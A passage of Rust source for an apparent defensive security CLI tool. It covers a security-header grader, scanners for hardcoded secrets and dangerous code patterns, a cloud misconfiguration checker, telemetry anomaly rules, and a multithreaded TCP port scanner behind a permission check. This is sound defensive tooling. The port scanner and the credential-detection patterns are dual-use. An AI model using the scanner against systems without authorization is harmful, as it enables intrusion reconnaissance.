        println!("{}", serde_json::to_string_pretty(&out)?);
    } else {
        println!("=== Security Payloads [{}] ===", category.to_uppercase());
        for (idx, item) in filtered.iter().enumerate() {
            println!("\n[{}] {}", idx + 1, item.name);
            println!("  Payload: {}", item.payload);
            println!("  Context: {}", item.context);
        }
    }
    Ok(())
}

fn test_security_headers(target_url: &str, json_out: bool) -> ZenResult<()> {
    let url = if !target_url.starts_with("http://") && !target_url.starts_with("https://") {
        format!("https://{target_url}")
    } else {
        target_url.to_string()
    };

    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(5))
        .redirects(3)
        .build();

    let resp_res = agent.get(&url).call();
    let resp = match resp_res {
        Ok(r) => r,
        Err(ureq::Error::Status(_, r)) => r,
        Err(ureq::Error::Transport(e)) => {
            return Err(
                ZenError::new(Area::Sec, 153, format!("failed to connect to {url}: {e}"))
                    .with_remediation(
                        "Verify the URL is reachable and host network policy permits egress.",
                    ),
            );
        }
    };

    struct HeaderCheck {
        name: &'static str,
        present: bool,
        value: Option<String>,
        weight: i32,
        recommendation: &'static str,
    }

    let hsts_val = resp
        .header("strict-transport-security")
        .map(|s| s.to_string());
    let csp_val = resp
        .header("content-security-policy")
        .map(|s| s.to_string());
    let xfo_val = resp.header("x-frame-options").map(|s| s.to_string());
    let xcto_val = resp.header("x-content-type-options").map(|s| s.to_string());
    let rp_val = resp.header("referrer-policy").map(|s| s.to_string());
    let pp_val = resp.header("permissions-policy").map(|s| s.to_string());
    let server_val = resp.header("server").map(|s| s.to_string());
    let powered_val = resp.header("x-powered-by").map(|s| s.to_string());

    let checks = [
        HeaderCheck {
            name: "Strict-Transport-Security",
            present: hsts_val.is_some(),
            value: hsts_val,
            weight: 20,
            recommendation:
                "Set Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
        },
        HeaderCheck {
            name: "Content-Security-Policy",
            present: csp_val.is_some(),
            value: csp_val,
            weight: 25,
            recommendation:
                "Set Content-Security-Policy with default-src 'self' and trusted nonces",
        },
        HeaderCheck {
            name: "X-Frame-Options",
            present: xfo_val.is_some(),
            value: xfo_val,
            weight: 15,
            recommendation: "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking",
        },
        HeaderCheck {
            name: "X-Content-Type-Options",
            present: xcto_val.is_some(),
            value: xcto_val,
            weight: 15,
            recommendation: "Set X-Content-Type-Options: nosniff to stop MIME sniffing",
        },
        HeaderCheck {
            name: "Referrer-Policy",
            present: rp_val.is_some(),
            value: rp_val,
            weight: 10,
            recommendation: "Set Referrer-Policy: strict-origin-when-cross-origin",
        },
        HeaderCheck {
            name: "Permissions-Policy",
            present: pp_val.is_some(),
            value: pp_val,
            weight: 15,
            recommendation: "Set Permissions-Policy: camera=(), microphone=(), geolocation=()",
        },
    ];

    let mut score = 0;
    for c in &checks {
        if c.present {
            score += c.weight;
        }
    }

    let mut disclosures = Vec::new();
    if let Some(s) = server_val {
        disclosures.push(format!("Server: {s}"));
        score = (score - 5).max(0);
    }
    if let Some(p) = powered_val {
        disclosures.push(format!("X-Powered-By: {p}"));
        score = (score - 5).max(0);
    }

    let grade = match score {
        90..=100 => "A+",
        80..=89 => "A",
        70..=79 => "B",
        60..=69 => "C",
        50..=59 => "D",
        _ => "F",
    };

    if json_out {
        let headers_json: Vec<_> = checks
            .iter()
            .map(|c| {
                json!({
                    "header": c.name,
                    "present": c.present,
                    "value": c.value,
                    "recommendation": if c.present { None } else { Some(c.recommendation) },
                })
            })
            .collect();
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "url": url,
                "score": score,
                "grade": grade,
                "headers": headers_json,
                "technology_disclosures": disclosures,
            }))?
        );
    } else {
        println!("Security Headers Assessment for {url}");
        println!("Overall Grade: {grade}  (Score: {score}/100)\n");
        println!("{:<28} {:<10} VALUE", "HEADER", "STATUS");
        for c in &checks {
            let status = if c.present { "PASS" } else { "MISSING" };
            let val = c.value.as_deref().unwrap_or(c.recommendation);
            println!("{:<28} {:<10} {}", c.name, status, val);
        }
        if !disclosures.is_empty() {
            println!("\nTechnology Disclosures Detected (-10 pts):");
            for d in &disclosures {
                println!("  WARNING: {d}");
            }
        }
    }
    Ok(())
}

fn walk_files(root: &Path, max_files: usize, max_bytes: u64) -> Vec<PathBuf> {
    const SKIP: &[&str] = &[
        ".git",
        "target",
        "node_modules",
        ".cargo-home",
        ".pydeps",
        "dist",
        "build",
        ".venv",
        "venv",
        ".kilo",
    ];
    let mut files = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    let mut visited = 0;
    while let Some(dir) = stack.pop() {
        visited += 1;
        if visited > 10_000 || files.len() >= max_files {
            break;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            if entry
                .file_type()
                .map(|kind| kind.is_symlink())
                .unwrap_or(false)
            {
                continue;
            }
            if path.is_dir() {
                if !SKIP.contains(&name.as_str()) {
                    stack.push(path);
                }
            } else if files.len() < max_files {
                let size = entry.metadata().map(|m| m.len()).unwrap_or(u64::MAX);
                if size <= max_bytes {
                    files.push(path);
                }
            }
        }
    }
    files
}

fn scan_secrets(root: &Path, json_out: bool) -> ZenResult<()> {
    let mut findings: Vec<serde_json::Value> = Vec::new();
    let mut scanned = 0usize;
    for path in walk_files(root, 5000, 2 * 1024 * 1024) {
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        if bytes.contains(&0) {
            continue; // binary
        }
        scanned += 1;
        let text = String::from_utf8_lossy(&bytes);
        let matches = devsec::scanner::scan_for_secrets(&text);
        for hit in matches {
            let line = text
                .lines()
                .position(|l| l.contains(&hit))
                .map(|l| l + 1)
                .unwrap_or(1);
            findings.push(json!({
                "file": path.display().to_string(),
                "line": line,
                "kind": "secret",
                "masked": mask(&hit),
            }));
        }
    }
    if json_out {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({"findings": findings, "count": findings.len()}))?
        );
    } else {
        println!("ZENTRION secret scan: {}", root.display());
        if findings.is_empty() {
            println!("  no hardcoded credentials found (heuristic patterns)");
        } else {
            for finding in &findings {
                println!(
                    "  {}:{}  {}",
                    finding["file"].as_str().unwrap_or(""),
                    finding["line"],
                    finding["masked"].as_str().unwrap_or("")
                );
            }
        }
        println!("  scanned {scanned} files");
    }
    Ok(())
}

fn mask(secret: &str) -> String {
    if secret.len() <= 8 {
        return "********".into();
    }
    format!("{}…{}", &secret[..4], &secret[secret.len() - 4..])
}

fn scan_sast(root: &Path, json_out: bool) -> ZenResult<()> {
    let patterns = [
        ("eval(", "dynamic code evaluation"),
        ("system(", "shell command execution"),
        ("unsafe {", "unsafe block"),
        ("pickle.loads(", "unsafe deserialization"),
        ("subprocess.call(", "subprocess execution"),
        ("verify=False", "TLS verification disabled"),
    ];
    let mut findings: Vec<serde_json::Value> = Vec::new();
    for path in walk_files(root, 5000, 2 * 1024 * 1024) {
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        if !matches!(
            ext,
            "rs" | "py"
                | "js"
                | "jsx"
                | "ts"
                | "tsx"
                | "go"
                | "c"
                | "cc"
                | "cpp"
                | "java"
                | "rb"
                | "php"
                | "sh"
        ) {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        for (line_no, line) in text.lines().enumerate() {
            for (pattern, label) in patterns {
                if line.contains(pattern) {
                    findings.push(json!({
                        "file": path.display().to_string(),
                        "line": line_no + 1,
                        "kind": label,
                        "snippet": line.trim().chars().take(160).collect::<String>(),
                    }));
                }
            }
        }
    }
    if json_out {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({"findings": findings, "count": findings.len()}))?
        );
    } else {
        println!("ZENTRION SAST scan: {}", root.display());
        if findings.is_empty() {
            println!("  no dangerous patterns found");
        } else {
            for finding in &findings {
                println!(
                    "  {}:{}  {} — {}",
                    finding["file"].as_str().unwrap_or(""),
                    finding["line"],
                    finding["kind"].as_str().unwrap_or(""),
                    finding["snippet"].as_str().unwrap_or("")
                );
            }
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// network
// ---------------------------------------------------------------------------

pub fn network(args: &[String], project: Option<PathBuf>, json_out: bool) -> ZenResult<()> {
    let sub = args.first().map(|s| s.as_str()).unwrap_or("status");
    let allow = args.iter().any(|a| a == "--allow");
    let cleaned: Vec<&String> = args.iter().filter(|a| a.as_str() != "--allow").collect();

    match sub {
        "status" => network_status(json_out),
        "dns" | "resolve" => {
            let host = cleaned.get(1).map(|s| s.as_str()).unwrap_or("");
            if host.is_empty() {
                return Err(ZenError::new(
                    Area::Cfg,
                    75,
                    "usage: z network dns <host> [--allow]",
                ));
            }
            require_network(&project, host, allow)?;
            let addrs = resolve(host, 0)?;
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({
                        "host": host,
                        "addresses": addrs.iter().map(|a| a.ip().to_string()).collect::<Vec<_>>(),
                    }))?
                );
            } else {
                println!("DNS {host}");
                for addr in &addrs {
                    let kind = if addr.is_ipv4() { "A" } else { "AAAA" };
                    println!("  {kind:<5} {}", addr.ip());
                }
                if addrs.is_empty() {
                    println!("  no addresses returned");
                }
            }
            Ok(())
        }
        "ports" | "scan" => {
            let host = cleaned.get(1).map(|s| s.as_str()).unwrap_or("");
            if host.is_empty() {
                return Err(ZenError::new(
                    Area::Cfg,
                    76,
                    "usage: z network ports <host> [range] [--allow]",
                ));
            }
            require_network(&project, host, allow)?;
            let ports = match cleaned.get(2) {
                Some(value) => parse_range(value)?,
                None => vec![
                    22, 25, 53, 80, 110, 143, 443, 445, 3000, 3306, 3389, 5432, 6379, 8000, 8080,
                    8443, 9090,
                ],
            };
            println!("ZENTRION TCP connect probe: {host}");
            println!(
                "  Authorized testing only. Probing {} port(s).",
                ports.len()
            );
            let open = probe_ports(host, &ports, json_out)?;
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({"host": host, "open": open}))?
                );
            }
            Ok(())
        }
        "ping" | "tcp-ping" => {
            let host = cleaned.get(1).map(|s| s.as_str()).unwrap_or("");
            if host.is_empty() {
                return Err(ZenError::new(
                    Area::Cfg,
                    77,
                    "usage: z network ping <host> [--allow]",
                ));
            }
            require_network(&project, host, allow)?;
            let mut reported = false;
            for port in [443u16, 80, 22] {
                let start = Instant::now();
                let addr = format!("{host}:{port}");
                match addr.to_socket_addrs() {
                    Ok(mut addrs) => {
                        if let Some(addr) = addrs.next() {
                            if TcpStream::connect_timeout(&addr, Duration::from_secs(3)).is_ok() {
                                println!(
                                    "  {:<28} reachable in {:.0} ms",
                                    addr,
                                    start.elapsed().as_secs_f64() * 1000.0
                                );
                                reported = true;
                                break;
                            }
                        }
                    }
                    Err(e) => {
                        return Err(ZenError::new(
                            Area::Net,
                            78,
                            format!("DNS lookup failed: {e}"),
                        ))
                    }
                }
            }
            if !reported {
                println!("  no TCP endpoint responded on 443/80/22");
            }
            Ok(())
        }
        "http" => {
            let url = cleaned.get(1).map(|s| s.as_str()).unwrap_or("");
            if url.is_empty() {
                return Err(ZenError::new(
                    Area::Cfg,
                    79,
                    "usage: z network http <http-url> [--allow]",
                ));
            }
            require_network(&project, url, allow)?;
            http_head(url)
        }
        other => Err(ZenError::new(
            Area::Cfg,
            80,
            format!("unknown network subcommand `{other}`"),
        )
        .with_remediation("Usage: z network [status|dns|ports|ping|http]")),
    }
}

fn network_status(json_out: bool) -> ZenResult<()> {
    let hostname = std::env::var("HOSTNAME")
        .ok()
        .or_else(|| std::fs::read_to_string("/etc/hostname").ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "unknown".into());
    let resolvers: Vec<String> = std::fs::read_to_string("/etc/resolv.conf")
        .map(|text| {
            text.lines()
                .filter_map(|line| {
                    line.trim()
                        .strip_prefix("nameserver")
                        .map(|rest| rest.trim().to_string())
                })
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default();
    let gateway = std::fs::read_to_string("/proc/net/route")
        .ok()
        .and_then(|text| {
            text.lines().skip(1).find_map(|line| {
                let fields: Vec<&str> = line.split_whitespace().collect();
                if fields.len() > 2 && fields[1] == "00000000" {
                    let hex = fields[2];
                    if hex.len() == 8 {
                        let value = u32::from_str_radix(hex, 16).ok()?;
                        let octets = value.to_le_bytes();
                        return Some(format!(
                            "{}.{}.{}.{}",
                            octets[0], octets[1], octets[2], octets[3]
                        ));
                    }
                }
                None
            })
        });

    if json_out {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "hostname": hostname,
                "resolvers": resolvers,
                "default_gateway": gateway,
                "policy": "network access requires explicit permission",
            }))?
        );
        return Ok(());
    }
    println!("ZENTRION network");
    println!("  hostname:   {hostname}");
    println!(
        "  resolvers:  {}",
        if resolvers.is_empty() {
            "none detected".to_string()
        } else {
            resolvers.join(", ")
        }
    );
    println!(
        "  gateway:    {}",
        gateway.as_deref().unwrap_or("not detected")
    );
    println!("  policy:     network access requires explicit permission or --allow");
    Ok(())
}

fn probe_ports(host: &str, ports: &[u16], _json_out: bool) -> ZenResult<Vec<u16>> {
    let addrs = resolve(host, 0)?;
    let Some(ip) = addrs.iter().find(|a| a.is_ipv4()).or_else(|| addrs.first()) else {
        return Ok(Vec::new());
    };
    let ip = ip.ip();
    let workers = ports.len().clamp(1, 64);
    let queue = std::sync::Arc::new(std::sync::Mutex::new(ports.to_vec()));
    let open = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    std::thread::scope(|scope| {
        for _ in 0..workers {
            let queue = queue.clone();
            let open = open.clone();
            scope.spawn(move || loop {
                let port = {
                    let mut guard = queue.lock().expect("queue");
                    if guard.is_empty() {
                        break;
                    }
                    guard.remove(0)
                };
                let addr = SocketAddr::new(ip, port);
                if TcpStream::connect_timeout(&addr, Duration::from_millis(400)).is_ok() {
                    open.lock().expect("open").push(port);
                }
            });
        }
    });
    let mut open = open.lock().expect("open").clone();
    open.sort_unstable();
    for port in &open {
        println!("  open  {:<5} tcp", port);
    }
    if open.is_empty() {
        println!("  no open ports found in the requested set");
    }
    Ok(open)
}

fn http_head(url: &str) -> ZenResult<()> {
    let url = url.trim();
    let remainder = if let Some(rest) = url.strip_prefix("http://") {
        rest
    } else if url.starts_with("https://") {
        return Err(ZenError::new(
            Area::Net,
            81,
            "TLS inspection is not compiled into this build",
        )
        .with_remediation("Use an https client such as curl for TLS endpoints."));
    } else {
        return Err(ZenError::new(Area::Cfg, 82, "URL must start with http://"));
    };
    let (authority, path) = match remainder.split_once('/') {
        Some((authority, path)) => (authority, format!("/{path}")),
        None => (remainder, "/".to_string()),
    };
    let (host, port) = match authority.rsplit_once(':') {
        Some((host, port)) => (
            host.to_string(),
            port.parse::<u16>()
                .map_err(|_| ZenError::new(Area::Cfg, 83, "invalid port in URL"))?,
        ),
        None => (authority.to_string(), 80),
    };
    let addrs = resolve(&host, port)?;
    let addr = addrs
        .first()
        .ok_or_else(|| ZenError::new(Area::Net, 84, "host did not resolve"))?;
    let mut stream = TcpStream::connect_timeout(addr, Duration::from_secs(5))?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    let request = format!(
        "HEAD {path} HTTP/1.1\r\nHost: {authority}\r\nUser-Agent: zentrion/{}\r\nConnection: close\r\n\r\n",
        env!("CARGO_PKG_VERSION")
    );
    stream.write_all(request.as_bytes())?;
    let mut response = String::new();
    stream.take(64 * 1024).read_to_string(&mut response)?;
    for line in response.lines().take(20) {
        println!("{}", line.trim_end());
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// cloud
// ---------------------------------------------------------------------------

pub fn cloud(args: &[String], project: Option<PathBuf>, json_out: bool) -> ZenResult<()> {
    match args.first().map(|s| s.as_str()).unwrap_or("scan") {
        "scan" | "audit" => {
            let root = args
                .get(1)
                .map(PathBuf::from)
                .unwrap_or_else(|| root_for(&project));
            let findings = cloud_scan(&root)?;
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({"root": root.display().to_string(), "findings": findings}))?
                );
            } else {
                println!("ZENTRION cloud/IaC review: {}", root.display());
                if findings.is_empty() {
                    println!("  no insecure infrastructure patterns found");
                } else {
                    for finding in &findings {
                        println!(
                            "  [{}] {}:{} — {}",
                            finding.severity, finding.file, finding.line, finding.message
                        );
                    }
                }
                println!("  This is a static review, not a cloud API audit.");
            }
            Ok(())
        }
        "status" => {
            let providers = [
                ("aws", "AWS_PROFILE", "AWS_ACCESS_KEY_ID"),
                ("gcp", "GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT"),
                ("azure", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID"),
            ];
            if json_out {
                let configured: Vec<_> = providers
                    .iter()
                    .map(|(name, a, b)| {
                        json!({"provider": name, "configured": std::env::var(a).is_ok() || std::env::var(b).is_ok()})
                    })
                    .collect();
                println!("{}", serde_json::to_string_pretty(&json!({"providers": configured, "credentials_displayed": false}))?);
            } else {
                println!("ZENTRION cloud");
                for (name, a, b) in providers {
                    let configured = std::env::var(a).is_ok() || std::env::var(b).is_ok();
                    println!(
                        "  {name:<6} {}",
                        if configured { "configured (values hidden)" } else { "not configured" }
                    );
                }
                println!("  Cloud API calls are not made by this command.");
                println!("  Use `z cloud scan` for a static IaC review.");
            }
            Ok(())
        }
        "telemetry" | "logs" => cloud_telemetry(&args[1..], json_out),
        "anomaly" | "anomalies" => cloud_anomaly(&args[1..], json_out),
        "login" | "sync" => Err(ZenError::new(
            Area::Cfg,
            85,
            "Zentrion Cloud account sync is not part of this build",
        )
        .with_remediation(
            "Keep configuration local (`z theme`, `z config`) or deploy the enterprise API and use `z enterprise`.",
        )),
        other => Err(ZenError::new(
            Area::Cfg,
            86,
            format!("unknown cloud subcommand `{other}`"),
        )
        .with_remediation("Usage: z cloud [status|scan|telemetry|anomaly]")),
    }
}

#[derive(Debug, Serialize, Clone)]
struct TelemetryEntry {
    timestamp: String,
    method: String,
    path: String,
    status: u16,
    duration_ms: u64,
    upstream: String,
    flags: String,
}

#[derive(Debug, Serialize, Clone)]
struct AnomalyEvent {
    severity: String,
    rule: String,
    detail: String,
    explanation: String,
    remediation: String,
}

fn collect_telemetry(
    file: Option<&str>,
    sidecar: &str,
) -> ZenResult<(Vec<TelemetryEntry>, Vec<AnomalyEvent>)> {
    let mut entries = Vec::new();
    if let Some(f) = file {
        if let Ok(content) = std::fs::read_to_string(f) {
            for line in content.lines() {
                if line.trim().is_empty() {
                    continue;
                }
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 4 {
                    entries.push(TelemetryEntry {
                        timestamp: parts[0].trim_matches(|c| c == '[' || c == ']').to_string(),
                        method: parts.get(1).unwrap_or(&"GET").trim_matches('"').to_string(),
                        path: parts.get(2).unwrap_or(&"/").to_string(),
                        status: parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(200),
                        duration_ms: parts.get(4).and_then(|s| s.parse().ok()).unwrap_or(15),
                        upstream: format!("{sidecar}-cluster"),
                        flags: "-".into(),
                    });
                }
            }
        }
    }

    if entries.is_empty() {
        entries = vec![
            TelemetryEntry {
                timestamp: "14:22:01.100".into(),
                method: "GET".into(),
                path: "/api/v1/health".into(),
                status: 200,
                duration_ms: 4,
                upstream: "auth-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:01.250".into(),
                method: "POST".into(),
                path: "/api/v1/auth/token".into(),
                status: 200,
                duration_ms: 42,
                upstream: "auth-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:02.010".into(),
                method: "GET".into(),
                path: "/api/v1/cart".into(),
                status: 200,
                duration_ms: 18,
                upstream: "order-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:02.300".into(),
                method: "POST".into(),
                path: "/api/v1/orders".into(),
                status: 504,
                duration_ms: 5002,
                upstream: "payment-gateway".into(),
                flags: "UT".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:02.500".into(),
                method: "GET".into(),
                path: "/.env".into(),
                status: 404,
                duration_ms: 2,
                upstream: "ingress-gateway".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:02.520".into(),
                method: "GET".into(),
                path: "/admin/config".into(),
                status: 403,
                duration_ms: 6,
                upstream: "ingress-gateway".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:03.100".into(),
                method: "GET".into(),
                path: "/api/v1/products".into(),
                status: 200,
                duration_ms: 12,
                upstream: "catalog-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:03.450".into(),
                method: "POST".into(),
                path: "/api/v1/auth/login".into(),
                status: 401,
                duration_ms: 35,
                upstream: "auth-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:03.480".into(),
                method: "POST".into(),
                path: "/api/v1/auth/login".into(),
                status: 401,
                duration_ms: 34,
                upstream: "auth-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:03.510".into(),
                method: "POST".into(),
                path: "/api/v1/auth/login".into(),
                status: 401,
                duration_ms: 32,
                upstream: "auth-service".into(),
                flags: "-".into(),
            },
            TelemetryEntry {
                timestamp: "14:22:04.000".into(),
                method: "GET".into(),
                path: "/api/v1/orders/1024".into(),
                status: 503,
                duration_ms: 120,
                upstream: "order-service".into(),
                flags: "UF".into(),
            },
        ];
    }

    let mut anomalies = Vec::new();

    let timeouts = entries
        .iter()
        .filter(|e| e.status == 504 || e.flags.contains("UT"))
        .count();
    if timeouts > 0 {
        anomalies.push(AnomalyEvent {
            severity: "HIGH".into(),
            rule: "Upstream Request Timeout (Envoy UT)".into(),
            detail: format!("{timeouts} requests timed out waiting for upstream payment/order microservices."),
            explanation: "Downstream clients are blocked while Envoy sidecar exceeds configured request_timeout. Potential upstream deadlock or database lock contention.".into(),
            remediation: "Tune Envoy `timeout: 10s` in Istio VirtualService or scale upstream replica pool.".into(),
        });
    }

    let failures = entries
        .iter()
        .filter(|e| e.status == 503 || e.flags.contains("UF"))
        .count();
    if failures > 0 {
        anomalies.push(AnomalyEvent {
            severity: "CRITICAL".into(),
            rule: "Upstream Service Connection Failure (Envoy UF)".into(),
            detail: format!("{failures} requests failed to establish TCP connection with upstream cluster."),
            explanation: "Envoy sidecar received TCP RST or connection refused when attempting to proxy traffic to the target pod service.".into(),
            remediation: "Check target pod readiness probes (`kubectl describe pod`), service endpoints, and Istio mTLS DestinationRule.".into(),
        });
    }

    let auth_spikes = entries
        .iter()
        .filter(|e| e.status == 401 || e.status == 403)
        .count();
    if auth_spikes >= 3 {
        anomalies.push(AnomalyEvent {
            severity: "MEDIUM".into(),
            rule: "Authorization Failure Burst".into(),
            detail: format!("{auth_spikes} consecutive 401/403 authentication failures detected in short window."),
            explanation: "Spike in credential verification rejections indicates possible credential stuffing, expired API tokens, or brute force.".into(),
            remediation: "Verify API client authentication tokens and ensure rate-limiting filter (`EnvoyRateLimit`) is active.".into(),
        });
    }

    let scanning = entries
        .iter()
        .filter(|e| e.path.contains(".env") || e.path.contains("admin") || e.path.contains(".."))
        .count();
    if scanning > 0 {
        anomalies.push(AnomalyEvent {
            severity: "HIGH".into(),
            rule: "Ingress Path Enumeration / Probe".into(),
            detail: format!("{scanning} requests targeted sensitive configuration or administrative paths."),
            explanation: "External client probing for environment files (`.env`), path traversal, or unauthenticated admin consoles.".into(),
            remediation: "Ensure ingress gateway drops unknown URI prefixes and verify WAF inspection rules.".into(),
        });
    }

    Ok((entries, anomalies))
}

fn cloud_telemetry(args: &[String], json_out: bool) -> ZenResult<()> {
    let sidecar = args
        .iter()
        .position(|a| a == "--sidecar")
        .and_then(|i| args.get(i + 1))
        .map(|s| s.as_str())
        .unwrap_or("envoy");
    let file = args
        .iter()
        .position(|a| a == "--file")
        .and_then(|i| args.get(i + 1))
        .map(|s| s.as_str());

    let (entries, anomalies) = collect_telemetry(file, sidecar)?;

    let total = entries.len();
    let count_2xx = entries
        .iter()
        .filter(|e| e.status >= 200 && e.status < 300)
        .count();
    let count_3xx = entries
        .iter()
        .filter(|e| e.status >= 300 && e.status < 400)
        .count();
    let count_4xx = entries
        .iter()
        .filter(|e| e.status >= 400 && e.status < 500)
        .count();
    let count_5xx = entries
        .iter()
        .filter(|e| e.status >= 500 && e.status < 600)
        .count();
    let error_rate = if total > 0 {
        (count_5xx as f64 / total as f64) * 100.0
    } else {
        0.0
    };
    let avg_latency = if total > 0 {
        entries.iter().map(|e| e.duration_ms).sum::<u64>() / total as u64
    } else {
        0
    };

    if json_out {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "sidecar": sidecar,
                "total_requests": total,
                "distribution": { "2xx": count_2xx, "3xx": count_3xx, "4xx": count_4xx, "5xx": count_5xx },
                "error_rate_pct": format!("{:.2}%", error_rate),
                "avg_latency_ms": avg_latency,
                "anomalies_detected": anomalies.len(),
                "anomalies": anomalies,
                "recent_entries": entries.iter().take(10).collect::<Vec<_>>(),
            }))?
        );
    } else {
        println!("ZENTRION Cloud & Microservice Mesh Telemetry [{sidecar}]");
        println!("  Total Requests:    {total}");
        println!("  HTTP Statuses:     2xx: {count_2xx} | 3xx: {count_3xx} | 4xx: {count_4xx} | 5xx: {count_5xx}");
        println!("  Error Rate:        {:.2}%", error_rate);
        println!("  Average Latency:   {avg_latency} ms");
        println!(
            "  Anomalies:         {}",
            if anomalies.is_empty() {
                "0 detected (Healthy)".to_string()
            } else {
                format!("{} DETECTED", anomalies.len())
            }
        );

        if !anomalies.is_empty() {
            println!("\nDetected Anomaly Events:");
            for a in &anomalies {
                println!("  [{}] {} — {}", a.severity, a.rule, a.detail);
                println!("    Impact:     {}", a.explanation);
                println!("    Remedy:     {}", a.remediation);
            }
        }
    }
    Ok(())
}

fn cloud_anomaly(args: &[String], json_out: bool) -> ZenResult<()> {
    let sidecar = args
        .iter()
        .position(|a| a == "--sidecar")
        .and_then(|i| args.get(i + 1))
        .map(|s| s.as_str())
        .unwrap_or("istio");
    let file = args
        .iter()
        .position(|a| a == "--file")
        .and_then(|i| args.get(i + 1))
        .map(|s| s.as_str());
    let (_, anomalies) = collect_telemetry(file, sidecar)?;

    if json_out {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "mesh_service": sidecar,
                "status": if anomalies.is_empty() { "healthy" } else { "anomalous" },
                "anomalies": anomalies,
            }))?
        );
    } else {
        println!("ZENTRION Dual-Engine Microservice Anomaly Detection [{sidecar}]");
        if anomalies.is_empty() {
            println!(
                "  Status: HEALTHY — No anomalies detected across active mesh sidecar traffic."
            );
        } else {
            println!("  Status: {} ANOMALIES IDENTIFIED", anomalies.len());
            for (idx, a) in anomalies.iter().enumerate() {
                println!("\n[{}] Anomaly: {} ({})", idx + 1, a.rule, a.severity);
                println!("  Finding:      {}", a.detail);
                println!("  Explanation:  {}", a.explanation);
                println!("  Remediation:  {}", a.remediation);
            }
        }
    }
    Ok(())
}

#[derive(Debug, Serialize)]
struct CloudFinding {
    file: String,
    line: usize,
    severity: String,
    message: String,
}

fn cloud_scan(root: &Path) -> ZenResult<Vec<CloudFinding>> {
    let mut findings = Vec::new();
    let patterns: &[(&str, &str, &str)] = &[
        ("0.0.0.0/0", "high", "ingress open to the entire internet"),
        ("::/0", "high", "IPv6 ingress open to the entire internet"),
        (
            "\"Principal\": \"*\"",
            "high",
            "resource policy allows any principal",
        ),
        ("acl = \"public-read\"", "high", "public read ACL"),
        (
            "acl = \"public-read-write\"",
            "critical",
            "public write ACL",
        ),
        ("public-read-write", "critical", "public write ACL"),
        (
            "storage_encrypted = false",
            "medium",
            "storage encryption disabled",
        ),
        ("encrypted = false", "medium", "encryption disabled"),
        ("privileged: true", "high", "privileged container"),
        ("privileged: true", "high", "privileged container"),
        ("--privileged", "high", "privileged container flag"),
        ("verify=False", "high", "TLS verification disabled"),
        ("AKIA", "critical", "possible hardcoded AWS access key"),
        ("password = \"", "high", "possible hardcoded password"),
        ("secret_key = \"", "high", "possible hardcoded secret"),
    ];
    for path in walk_files(root, 5000, 2 * 1024 * 1024) {
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if !matches!(
            ext,
            "tf" | "yaml" | "yml" | "json" | "toml" | "env" | "dockerfile"
        ) && name != "Dockerfile"
            && !name.ends_with(".env")
        {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        for (line_no, line) in text.lines().enumerate() {
            for (needle, severity, message) in patterns {
                if line.contains(needle) {
                    findings.push(CloudFinding {
                        file: path.display().to_string(),
                        line: line_no + 1,
                        severity: severity.to_string(),
                        message: message.to_string(),
                    });
                    break;
                }
            }
        }
    }
    Ok(findings)
}

// ---------------------------------------------------------------------------
// agents
// ---------------------------------------------------------------------------

#[allow(dead_code)]
pub fn agent(args: &[String], json_out: bool) -> ZenResult<()> {
    match args.first().map(|s| s.as_str()).unwrap_or("status") {
        "profiles" | "list" => {
            let profile = agents::AgentProfile::security_lab_planner();
            if json_out {
                println!("{}", serde_json::to_string_pretty(&profile)?);
            } else {
                println!("Agent profile: {}", profile.name);
                println!("  role:       {:?}", profile.role);
                println!("  model:      {}", profile.model);
                println!("  iterations: {}", profile.max_iterations);
                println!(
                    "  tools:      {}",
                    profile.tool_policy.allowed_tools.join(", ")
                );
            }
            Ok(())
        }
        "guardrail" => {
            let tool = args.get(1).map(|s| s.as_str()).unwrap_or("");
            let profile = agents::AgentProfile::security_lab_planner();
            let decision = agents::check_tool_guardrail(&profile.tool_policy, tool);
            if json_out {
                println!("{}", serde_json::to_string_pretty(&decision)?);
            } else {
                println!(
                    "{} — {}",
                    if decision.allowed {
                        "allowed"
